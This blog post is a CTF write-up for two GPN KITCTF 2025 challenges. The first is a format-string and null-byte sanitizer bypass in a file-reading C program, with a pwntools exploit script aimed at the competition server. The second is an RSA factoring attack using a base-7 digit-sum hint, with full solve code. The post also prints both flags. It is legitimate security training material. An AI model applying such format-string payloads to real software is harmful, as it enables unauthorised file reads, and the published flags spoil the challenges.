---
title: " GPN KITCTF 2025 - CTF Writeup"
subtitle: " A writeup for the GPN KITCTF 2025 CTF challenges that I managed to solve."
summary: "* This game was developed, hosted and released by KITCTF !!*"
date: 2025-06-22
cardimage: cover.png
featureimage: cover.png
caption: ctf
authors:
  - Havoc: logo.png
---

# no-nc

This chall was under pwn but it brewed chaos.

![](https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FvX8fOW6UlgelEMZvBdpF%252Fimage.png%3Falt%3Dmedia%26token%3D65515f37-fef4-44f1-88e8-552f1701a610&width=768&dpr=4&quality=100&sign=7c1dfdc5&sv=2)

This is how i solved it with my buddy chat-gpt great assist ,we did it.you deserve the credit.was that awkward ***(laughs)***

```shell
Havoc@kali:~/play/no_nc/no-nc$ checksec nc
[*] '/home/nikifkon/play/no_nc/no-nc/nc'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```


```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#define RAW_FLAG "GPNCTF{fake_flag}"

char *FLAG = RAW_FLAG;

int no(char c)
{
    if (c == '.')
        return 1;
    if (c == '/')
        return 1;
    if (c == 'n')
        return 1;
    if (c == 'c')
        return 1;
    return 0;
}

char filebuf[4096] = {};
int main(int argc, char **argv)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    char buf[200] = {};
    puts("Give me a file to read");
    read(STDIN_FILENO, buf, (sizeof buf) - 1);
    buf[sizeof buf - 1] = '\0';
    size_t str_len = strlen(buf);
    for (size_t i = 0; i < str_len; i++)
    {
        if (no(buf[i]))
        {
            puts("I don't like your character!");
            exit(1);
        }
    }
    char *filename = calloc(200, 1);
    snprintf(filename, (sizeof filename) - 1, buf);
    puts("Will open:");
    puts(filename);
    int fd = open(filename, 0);
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }
    while (1)
    {
        int count = read(fd, filebuf, (sizeof filebuf) - 1);
        if (count > 0)
        {
            write(STDOUT_FILENO, filebuf, count);
        }
        else
        {
            break;
        }
    }
}
```

This program implement `cat` , except it take filename from STDIN and sanitize it with `int no(char c)`.

## *What our goal?*

- read flag from memory

- bypass sanitizer and read binary (btw binary named is `nc`)


## Finding vulnerability

This step was straightforward for me: my IDE showed me something cooler and juicy!!!

![](https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FYKC8lizd5fgn3JUp0wCj%252Fimage.png%3Falt%3Dmedia%26token%3Da0d1fa9a-e447-42de-b4b1-cf576ac076c8&width=768&dpr=4&quality=100&sign=6b9124ae&sv=2)

warning from clangd extension for VSCode

## Exploiting. 

Can we leak the flag?
```
read(STDIN_FILENO, buf, (sizeof buf) - 1);
...
snprintf(filename, (sizeof filename) - 1, buf);
puts(filename);
```

This fragment give up ability to leak:

- `rcx`, `r8`, and `r9` registers

- memory from stack below `buf`

- memory pointed from 2 above items (with `%s`)

We might want to create pointer to FLAG inside `buf` but with PIE enabled we don't have address of `FLAG`.

So lets try to
## Exploiting by Bypass sanitizer
Another vulnerability: 

Program only sanitize characters before first null byte:

```
read(STDIN_FILENO, buf, (sizeof buf) - 1);
buf[sizeof buf - 1] = '\0';
size_t str_len = strlen(buf);
for (size_t i = 0; i < str_len; i++)
{
    if (no(buf[i]))
```

So we can place `n` and `c` character after null byte and reference it from beginning of string using `%C` (alias to forbidden `%lc`):

![](https://yawb.gitbook.io/~gitbook/image?url=https%3A%2F%2F1200844871-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Ft0CErfcYJSKkv4naX3IG%252Fuploads%252FkuBPxPt0wIvhzM5eInuX%252Fimage.png%3Falt%3Dmedia%26token%3Db60ffd4e-f5e8-424d-aa52-3b2da362f5ab&width=768&dpr=4&quality=100&sign=1cb87272&sv=2)

**final payload**

To correctly choice argument position we need to know that

- there 6 slots for arguments in registers: rdi, rsi, rdx, rcx, r8, and r9.

- Other arguments layout on stack: `rsp`, `rsp+0x8`, `rsp+0x10`, and so on.

- Indexing starting from 0.

- ⇒ Argument at `rsp` has index `6`.

- ⇒ Argument at `rsp+8*x` has index rsp `6 + x`

For example, char `c` in our payload has address `rsp+0x18` (because `rsp = &buf`) therefor it has index 6 + 3 = 9

***Solve script (generalized for any filename)***

```python
import pathlib

import pwn


pwn.context.binary = elf = pwn.ELF("./nc")
gdbscript = [
    "b snprintf",
    "c",
]


def get_tube() -> pwn.tube:
    if pwn.args['REMOTE']:
        io = pwn.remote("springside-of-hyper-extreme-liberty.gpn23.ctf.kitctf.de", "443", ssl=True)
    elif pwn.args['GDB']:
        io = elf.debug(gdbscript="\n".join(gdbscript))
    else:
        io = elf.process()
    return io


io = get_tube()

io.readline()

filename = b"nc"

off = 4 * min(2, len(filename)) + 5 * max(0, len(filename) - 2) + 1
#         %X$C                        %XX$C                      b'\0'
off += -off % 8
index = off // 8

payload = pwn.flat([
    f"%{i}$C".encode()
    for i in range(6 + index, 6 + index + len(filename))
]).ljust(off, b'\x00')

payload += pwn.flat([
    bytes([c]).ljust(8, b'\x00') for c in filename
])
assert len(payload) < 200

pwn.log.hexdump(payload)
io.sendline(payload)
io.recvline()
io.recvline()

pathlib.Path('nc_remote').write_bytes(io.recvall())
```

After we can grep the flag:

Copy

```shell
Havoc@kali:~/play/no_nc/no-nc$ strings nc_remote | grep GPN
GPNCTF{up_anD_dowN_A1l_aR0UnD_6OES_7h3_n_dimeN5ionAL_CiRcLe_W7f_1S_ThIs_F1ag}
```

```shell
GPNCTF{up_anD_dowN_A1l_aR0UnD_6OES_7h3_n_dimeN5ionAL_CiRcLe_W7f_1S_ThIs_F1ag}
```

> And friends lets be clear am not good in rv challs so most of the work was done by chat-gpt and i concluded the rest upto the final flag

>*The next challenge was  a cryptography challenge and this is how i went on with it ,,,it was my first to solve though*.

## **Hinting**

![kitctf](https://github.com/Daniel-wambua/blogz/blob/main/content/CTF/writeup10/images/hintingchallenge.png?raw=true)

## Challenge Description

The challenge `hinting` is a cryptography problem that provides an RSA modulus `n`, public exponent `e`, ciphertext `c`, and a hint `V`. The hint `V` is a vector representing `(p_i + q_i) % 7` for the base-7 digits of the prime factors `p` and `q` of `n`.

## Files Provided

- `hinting.sage`: A SageMath script that generates the challenge parameters.

```python
import secrets
from Crypto.Util.number import bytes_to_long
import sys

FLAG = b"There was an actual flag here once"
FLAG = sys.argv[1].encode() if len(sys.argv) > 1 else FLAG
BS = 1024
FLAG = bytes_to_long(FLAG)
set_random_seed(secrets.randbelow(int(2**64)))
p = random_prime(2 ** (BS), lbound=2 ** (BS - 1))
q = random_prime(2** (BS), lbound=2 ** (BS - 1))
n = p * q
e = 0x10001
c = pow(FLAG, e, n)

print(f"n = {n:x}")
print(f"e = {e:x}")
print(f"c = {int(c):x}")

pp, qq = (
    p.digits(base=7, padto=int(log(2 ** (BS + 1), 7)) + 2),
    q.digits(base=7, padto=int(log(2 ** (BS + 1), 7)) + 2),
)
V = vector([(pp[i] + qq[i]) % 7 for i in range(len(pp))])
print(V)
```


- `output.txt`: Contains the values of `n`, `e`, `c`, and the hint vector `V`.


 ```python
 n = 960f50f6cb18b2767306b4f704785089726d282ef1e40bf946f585f006a7c3588aa0298d4c6b2d57a9fb400ac10216476c0a810a1bba3faa7036ecd2b7ebe4317e4acc5ea35a3bc6e1cd7ba8d9f8a6d35f05bf1a8c54fe17bd14d5146f80715957968856d12c27278d380bf81934dc1b8060be1ae5ea9652a92658a4fc273ad180d2f323058dcc09287d4e41a04edc585c89079048a3f01bd2d617f45e488d55770dfda468d2b71089d1ee86daf287ec88e8333c0185ec941732a924518ac068ee5ba69e6f0b23eccd8445ad22ed74d7fcf1355d19032c604c9c8c9208265a5077f7c03674759f3de432a8b8ac8f3845a8358fbaa607f8770717b973f67d8b6b
e = 10001
c = 78fe786edf7f78b5c7b0d4edd12ece946f021df730a825a7254dc80dddf8460a946eb25c4257c03a39a89472428534c1a98c0b509a2770ee1828c256941f67535f04ab05716c7ed86c821d821afed9ba4309837b4f3f6077e40c891bf6f3dcb714728c8458a0364562cb714fa9a596c7eccd4eafae6075dbab3f0ea745646fddeae98c058139a3200765b5f526f8807d6c72917218d7b77394da3fa6ab3a292ffc756a5b6b1c52bc58c4a212981da958c6bd6a21cd113cbc93497d5f016d6bc1a02cf77e96c3236d632d71a8b137c14742b3a5842754c35409e8f28126b91d6fa2b2fe4dedc531011ecce8943d2ee332acc3349e6256ce2c84d41aec718b4056
(5, 6, 1, 0, 6, 3, 5, 2, 2, 0, 6, 4, 0, 2, 2, 1, 2, 5, 3, 5, 4, 6, 1, 1, 2, 0, 2, 3, 5, 0, 6, 4, 0, 6, 1, 4, 0, 3, 5, 1, 2, 1, 6, 5, 1, 0, 1, 4, 3, 5, 2, 5, 4, 4, 4, 5, 2, 1, 3, 2, 3, 6, 2, 5, 1, 3, 3, 0, 6, 2, 2, 1, 4, 1, 3, 6, 3, 0, 4, 1, 4, 5, 0, 0, 0, 3, 2, 5, 0, 6, 3, 0, 5, 5, 1, 5, 4, 0, 5, 2, 0, 2, 3, 0, 4, 1, 2, 6, 5, 2, 3, 2, 4, 0, 2, 1, 1, 3, 5, 1, 6, 3, 2, 1, 3, 4, 6, 1, 0, 1, 1, 6, 1, 6, 6, 4, 1, 5, 2, 6, 3, 2, 0, 4, 5, 1, 1, 4, 5, 4, 0, 4, 5, 2, 1, 2, 1, 3, 1, 6, 5, 4, 4, 1, 1, 0, 5, 4, 1, 3, 1, 1, 5, 1, 0, 2, 5, 1, 2, 3, 6, 5, 2, 5, 3, 0, 6, 6, 5, 0, 3, 3, 0, 3, 6, 1, 4, 6, 2, 1, 1, 6, 2, 1, 3, 2, 5, 0, 1, 6, 3, 5, 6, 1, 2, 0, 4, 2, 4, 1, 4, 0, 6, 0, 0, 2, 5, 2, 0, 3, 0, 1, 2, 1, 0, 6, 3, 1, 4, 4, 5, 5, 1, 0, 1, 5, 6, 2, 0, 0, 1, 2, 0, 4, 1, 5, 6, 0, 0, 2, 6, 6, 2, 2, 5, 6, 2, 0, 4, 5, 2, 2, 4, 2, 2, 6, 5, 3, 1, 4, 5, 1, 0, 2, 4, 4, 1, 5, 4, 4, 6, 2, 3, 3, 6, 3, 3, 1, 6, 5, 3, 4, 5, 5, 0, 6, 5, 1, 3, 6, 3, 3, 2, 6, 5, 3, 5, 3, 5, 0, 3, 1, 6, 5, 2, 5, 0, 1, 2, 1, 6, 6, 0, 3, 1, 5, 6, 2, 6, 0, 6, 5, 5, 2, 6, 3, 1, 4, 6, 2, 3, 6, 0, 4, 5, 4, 1, 3, 2, 5, 6, 0, 1, 6, 6, 0, 0)
```

## Analysis

### `hinting.sage` Analysis

The `hinting.sage` script reveals the following:

- RSA parameters: `n = p * q`, `e = 0x10001`, `c = pow(FLAG, e, n)`.
- `BS = 1024`: `p` and `q` are 1024-bit random primes.
- The hint `V` is generated by taking the base-7 digits of `p` (`pp`) and `q` (`qq`), padding them to the same length, and then computing `(pp[i] + qq[i]) % 7` for each digit position `i`.

This means we have partial information about the base-7 digits of `p` and `q`. Specifically, for each digit position `i`, we know `(p_i + q_i) mod 7 = V_i`.

### `output.txt` Analysis

`output.txt` provides the concrete values:

- `n` (hexadecimal)
- `e` (hexadecimal)
- `c` (hexadecimal)
- `V` (a Python tuple of integers)

## Solution Approach: Lifting Attack (Hensel's Lemma Variant)

The problem can be solved using a lifting attack, which is a variant of Hensel's Lemma. The core idea is to reconstruct the prime factors `p` and `q` digit by digit in base 7, using the given hint `V` and the relationship `n = p * q`.

1.  **Initial Digits (p_0, q_0):**
    We know that `n % 7 = (p % 7) * (q % 7)`. Since `p % 7 = p_0` and `q % 7 = q_0` (where `p_0` and `q_0` are the least significant base-7 digits of `p` and `q`), we have `n % 7 = (p_0 * q_0) % 7`. We also know `(p_0 + q_0) % 7 = V[0]`. We can iterate through all possible `(p_0, q_0)` pairs (from 0 to 6) to find the valid starting digits that satisfy both conditions.

2.  **Iterative Lifting:**
    For each subsequent digit position `i` (from 1 to `len(V) - 1`):
    -   We know `(p_i + q_i) % 7 = V[i]`. Since `p_i` and `q_i` are digits in base 7 (0-6), `p_i + q_i` can be `V[i]` or `V[i] + 7` (if there's a carry from the previous digit sum).
    -   We need to find `(p_i, q_i)` such that when combined with the already determined lower-order digits, the product `p * q` matches `n` modulo `7^(i+1)`.
    -   The equation `n = p * q` can be expanded in base 7. Considering `n = (p_0 + 7p_1 + ...) * (q_0 + 7q_1 + ...)`.
    -   At each step `i`, we have partial `p` and `q` values (let's call them `p_partial` and `q_partial`) formed by digits up to `i-1`. We then try all possible `(p_i, q_i)` pairs (0-6) that satisfy `(p_i + q_i) % 7 = V[i]`. For each pair, we form `p_new = p_partial + p_i * 7^i` and `q_new = q_partial + q_i * 7^i`. We then check if `(p_new * q_new) % 7^(i+1) == n % 7^(i+1)`.
    -   If a pair satisfies the condition, we append `p_i` and `q_i` to our lists of digits for `p` and `q` and proceed to the next digit position.

3.  **Factorization and Decryption:**
    Once all digits are found, we reconstruct the full `p` and `q` values. We then verify that `p * q == n`. If they match, we have factored `n`. From `p` and `q`, we can calculate `phi(n) = (p - 1) * (q - 1)` and then the private exponent `d = pow(e, -1, phi)`. Finally, we decrypt the ciphertext `c` using `FLAG = pow(c, d, n)`.

## Implementation (Python Script)

The following Python script implements the described lifting attack which i was given by chat gpt,big up my friend you deserve the credit:

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes

n_hex = "960f50f6cb18b2767306b4f704785089726d282ef1e40bf946f585f006a7c3588aa0298d4c6b2d57a9fb400ac10216476c0a810a1bba3faa7036ecd2b7ebe4317e4acc5ea35a3bc6e1cd7ba8d9f8a6d35f05bf1a8c54fe17bd14d5146f80715957968856d12c27278d380bf81934dc1b8060be1ae5ea9652a92658a4fc273ad180d2f323058dcc09287d4e41a04edc585c89079048a3f01bd2d617f45e488d55770dfda468d2b71089d1ee86daf287ec88e8333c0185ec941732a924518ac068ee5ba69e6f0b23eccd8445ad22ed74d7fcf1355d19032c604c9c8c9208265a5077f7c03674759f3de432a8b8ac8f3845a8358fbaa607f8770717b973f67d8b6b"
e_hex = "10001"
c_hex = "78fe786edf7f78b5c7b0d4edd12ece946f021df730a825a7254dc80dddf8460a946eb25c4257c03a39a89472428534c1a98c0b509a2770ee1828c256941f67535f04ab05716c7ed86c821d821afed9ba4309837b4f3f6077e40c891bf6f3dcb714728c8458a0364562cb714fa9a596c7eccd4eafae6075dbab3f0ea745646fddeae98c058139a3200765b5f526f8807d6c72917218d7b77394da3fa6ab3a292ffc756a5b6b1c52bc58c4a212981da958c6bd6a21cd113cbc93497d5f016d6bc1a02cf77e96c3236d632d71a8b137c14742b3a5842754c35409e8f28126b91d6fa2b2fe4dedc531011ecce8943d2ee332acc3349e6256ce2c84d41aec718b4056"
V_str = "(5, 6, 1, 0, 6, 3, 5, 2, 2, 0, 6, 4, 0, 2, 2, 1, 2, 5, 3, 5, 4, 6, 1, 1, 2, 0, 2, 3, 5, 0, 6, 4, 0, 6, 1, 4, 0, 3, 5, 1, 2, 1, 6, 5, 1, 0, 1, 4, 3, 5, 2, 5, 4, 4, 4, 5, 2, 1, 3, 2, 3, 6, 2, 5, 1, 3, 3, 0, 6, 2, 2, 1, 4, 1, 3, 6, 3, 0, 4, 1, 4, 5, 0, 0, 0, 3, 2, 5, 0, 6, 3, 0, 5, 5, 1, 5, 4, 0, 5, 2, 0, 2, 3, 0, 4, 1, 2, 6, 5, 2, 3, 2, 4, 0, 2, 1, 1, 3, 5, 1, 6, 3, 2, 1, 3, 4, 6, 1, 0, 1, 1, 6, 1, 6, 6, 4, 1, 5, 2, 6, 3, 2, 0, 4, 5, 1, 1, 4, 5, 4, 0, 4, 5, 2, 1, 2, 1, 3, 1, 6, 5, 4, 4, 1, 1, 0, 5, 4, 1, 3, 1, 1, 5, 1, 0, 2, 5, 1, 2, 3, 6, 5, 2, 5, 3, 0, 6, 6, 5, 0, 3, 3, 0, 3, 6, 1, 4, 6, 2, 1, 1, 6, 2, 1, 3, 2, 5, 0, 1, 6, 3, 5, 6, 1, 2, 0, 4, 2, 4, 1, 4, 0, 6, 0, 0, 2, 5, 2, 0, 3, 0, 1, 2, 1, 0, 6, 3, 1, 4, 4, 5, 5, 1, 0, 1, 5, 6, 2, 0, 0, 1, 2, 0, 4, 1, 5, 6, 0, 0, 2, 6, 6, 2, 2, 5, 6, 2, 0, 4, 5, 2, 2, 4, 2, 2, 6, 5, 3, 1, 4, 5, 1, 0, 2, 4, 4, 1, 5, 4, 4, 6, 2, 3, 3, 6, 3, 3, 1, 6, 5, 3, 4, 5, 5, 0, 6, 5, 1, 3, 6, 3, 3, 2, 6, 5, 3, 5, 3, 5, 0, 3, 1, 6, 5, 2, 5, 0, 1, 2, 1, 6, 6, 0, 3, 1, 5, 6, 2, 6, 0, 6, 5, 5, 2, 6, 3, 1, 4, 6, 2, 3, 6, 0, 4, 5, 4, 1, 3, 2, 5, 6, 0, 1, 6, 6, 0, 0)"

def solve():
    n = int(n_hex, 16)
    e = int(e_hex, 16)
    c = int(c_hex, 16)
    V = eval(V_str)

    n_mod_7 = n % 7

    possible_p0_q0 = []
    for p0 in range(7):
        for q0 in range(7):
            if (p0 + q0) % 7 == V[0] and (p0 * q0) % 7 == n_mod_7:
                possible_p0_q0.append((p0, q0))

    print(f"Possible (p0, q0) pairs: {possible_p0_q0}")

    for p_init, q_init in possible_p0_q0:
        p_digits = [p_init]
        q_digits = [q_init]

        for i in range(1, len(V)):
            found_next_digits = False
            for next_p_digit in range(7):
                for next_q_digit in range(7):
                    if (next_p_digit + next_q_digit) % 7 == V[i]:
                        # Construct the numbers up to the current digit
                        current_p_val = sum(d * (7**j) for j, d in enumerate(p_digits + [next_p_digit]))
                        current_q_val = sum(d * (7**j) for j, d in enumerate(q_digits + [next_q_digit]))

                        # Check if the product matches n modulo 7^(i+1)
                        if (current_p_val * current_q_val) % (7**(i+1)) == n % (7**(i+1)):
                            p_digits.append(next_p_digit)
                            q_digits.append(next_q_digit)
                            found_next_digits = True
                            break
                if found_next_digits:
                    break
            if not found_next_digits:
                break # This path didn't work, try next p0, q0

        if len(p_digits) == len(V) and len(q_digits) == len(V):
            # Reconstruct p and q from the digits (least significant first)
            p = sum(d * (7**j) for j, d in enumerate(p_digits))
            q = sum(d * (7**j) for j, d in enumerate(q_digits))

            if p * q == n:
                print(f"Found p: {p}")
                print(f"Found q: {q}")

                # Now calculate phi(n) and d
                phi = (p - 1) * (q - 1)
                d = pow(e, -1, phi)

                # Decrypt the ciphertext
                m = pow(c, d, n)
                flag = long_to_bytes(m)
                print(f"Flag: {flag.decode()}")
                return flag.decode()
    return None

flag = solve()
if flag:
    print(f"The flag is: {flag}")
else:
    print("Could not find the flag.")
```

## Execution and Flag

Running the script successfully factored `n` into `p` and `q` and then decrypted the flag.

```
Possible (p0, q0) pairs: [(1, 4), (4, 1)]
Found p: 107081590102994279431425142273165548583314246476215620342950117309270748047556198886880652973013533803026699630455405746204251672129112788665721566551654800021953684025972970279740511885379673381684517286535474827927390298929647937547334749938941564581210616732957069256721939937345544930292049384033685617959
Found q: 176905278104599945246676137446215110385207650620348722263066964160918233474291760221897848795622468492787847720198375810261341819191731473023323362043908703146030162716200850923581985730383926797182627925717132721727616831080816614622731687424811340659022489790537251723643356595292200458188611206172885332509
Flag: GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}
The flag is: GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}
```

## Flag

`GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}`

>  **it was fun though**


